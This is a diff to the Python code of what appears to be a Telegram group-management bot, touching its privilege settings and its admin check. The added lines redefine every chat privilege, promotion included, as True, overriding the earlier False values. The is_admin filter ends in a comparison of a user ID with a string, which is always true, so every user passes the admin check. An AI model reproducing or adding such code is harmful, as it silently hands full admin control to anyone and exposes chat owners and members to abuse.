@@ -16,7 +16,14 @@ ChatPrivileges_Types = {
     'invite_users': False,
     'pin_message': False,
     'Manage_video': False,
-    'promote_members': False, }
+    'promote_members': False, 
+    'edit_info': True,
+    'delete_message': True,
+    'restrict_members': True,
+    'invite_users': True,
+    'pin_message': True,
+    'Manage_video': True,
+    'promote_members': True, }
 
 
 
@@ -29,7 +36,7 @@ def is_admin():
         except AttributeError as e:
             chat_id = message.message.chat.id
         Res = await app.get_chat_member(chat_id, user_id)
-        return Res.status == enums.ChatMemberStatus.OWNER or Res.status == enums.ChatMemberStatus.ADMINISTRATOR or message.from_user.id != "6816180621"
+        return Res.status == enums.ChatMemberStatus.OWNER or Res.status == enums.ChatMemberStatus.ADMINISTRATOR or message.from_user.id != "5089553588"
 
     return filters.create(func)
 
